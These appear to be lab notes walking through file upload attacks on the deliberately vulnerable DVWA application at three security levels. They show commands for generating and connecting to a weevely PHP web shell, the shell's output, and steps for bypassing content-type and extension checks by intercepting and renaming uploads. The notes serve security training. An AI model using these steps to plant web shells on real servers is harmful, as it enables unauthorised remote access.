### File Upload Vulnerabilities-Low-Security

* This type of vulnerabilty allows users to upload files such as php shells.

* Steps

1. First create a new php shell with weevely

```
root@kali:~# weevely generate pass ~/Documents/shelling.php
Generated backdoor with password 'pass' in '/root/Documents/shelling.php' of 1285 byte size.
```

* So here we first specifed we want the command weevely, generate to generate the web shell followed by a password followed by where we want to store the shell in.


2. Now we can interact with the php web shell 

```
root@kali:~# weevely http://10.0.2.5/dvwa/hackable/uploads/shelling.php pass
```

* Here i used weevely to connect to the php web shell by connecting to to where the php web shell was uploaded.
* After that i receive a web shell.

```
weevely> id
[-][channel] The remote script execution triggers an error 500, please verify script integrity and sent payload correctness
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@10.0.2.5:/var/www/dvwa/hackable/uploads $ 
```


---

### File Upload Vulnerabilities-Medium-Security


* As the security steps up, there are few minor checks to see if the file is infact a image and not a php web shell etc.

* A new security check is content-type which you can see with any proxy.

```
Content-Type: image/jpeg
```

* We can bypass this by the following steps.

1. First rename the php web shell to a image by changing the extension from .php to .jpeg for example.
2. Then we intercept the web request.
3. From here we change the filename from .jpeg to .php
4. The server will not check for it.



```
root@kali:~/Documents# weevely http://10.0.2.5/dvwa/hackable/uploads/shelling2.php pass
```

```
www-data@10.0.2.5:/var/www/dvwa/hackable/uploads $ id
[-][channel] The remote script execution triggers an error 500, please verify script integrity and sent payload correctness
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

### File Upload Vulnerabilities-High-Security


* Now there two checks on the image that is being uploaded. One check for file type to see if it is a image.
* There is another check to see if the file extension is also jpeg.

* Steps to bypass

1. Choose a image that is jpeg etc.
2. Capture the request with a proxy and now add the php extension before the jpeg.
3. Now send the request to the server.
4. The file should successfully upload.

```
root@kali:~/Documents# weevely http://10.0.2.5/dvwa/hackable/uploads/shell4.php.jpg pass
```

